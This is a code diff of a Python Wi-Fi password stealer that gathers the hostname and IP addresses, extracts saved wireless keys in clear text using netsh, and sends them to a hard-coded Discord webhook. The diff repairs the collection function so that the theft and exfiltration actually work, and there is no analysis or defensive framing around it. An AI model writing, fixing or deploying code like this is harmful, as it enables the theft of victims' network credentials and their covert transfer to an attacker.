@@ -3,24 +3,28 @@ import requests
 import time
 import socket
 import subprocess
+
 computer_name = socket.gethostname()
 private_ip = socket.gethostbyname(socket.gethostname())
 public_ip = socket.gethostbyname(socket.getfqdn())
 token = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"
 
-wifistolen = def wifistealer():
+def wifistealer():
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
     profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 
+    results = ""
     for i in profiles:
-        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
-        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
-    try:
-        print ("{:<30}|  {:<}".format(i, results[0]))
-    except IndexError:
-        print ("{:<30}|  {:<}".format(i, ""))
+        try:
+            output = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
+            output = [b.split(":")[1][1:-1] for b in output if "Key Content" in b]
+            results += f"{i}: {output[0]}\n"
+        except IndexError:
+            results += f"{i}: \n"
     
-    input("")
+    return results
+
+wifistolen = wifistealer()
 
 embed = {
     "title": "BOOM, HEADSHOT!",
@@ -33,7 +37,7 @@ embed = {
             "inline": False
         },
         {
-            "name": "",
+            "name": "footer2",
             "value": wifistolen,
             "inline": True
         }
@@ -57,8 +61,7 @@ headers = {
 # Send the webhook
 response = requests.post(token, data=json.dumps(payload), headers=headers)
 
-# Dont fuck with anything below as it will check if this will fucking run
-
+# Check the response
 if response.status_code == 204:
     time.sleep(0)
 else:
